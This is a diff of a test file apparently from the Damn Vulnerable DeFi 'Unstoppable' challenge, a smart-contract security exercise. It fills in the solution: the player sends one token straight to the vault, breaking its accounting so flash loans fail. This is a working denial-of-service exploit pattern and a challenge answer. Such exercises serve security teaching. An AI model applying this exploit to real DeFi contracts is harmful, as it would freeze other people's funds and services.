@@ -44,12 +44,15 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        console.log(await vault.totalSupply())
+        console.log(await vault.totalAssets())
+        await token.connect(player).transfer(vault.address, 1n * 10n ** 18n);
+        console.log(await vault.totalSupply())
+        console.log(await vault.totalAssets())
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
         // It is no longer possible to execute flash loans
         await expect(
             receiverContract.executeFlashLoan(100n * 10n ** 18n)
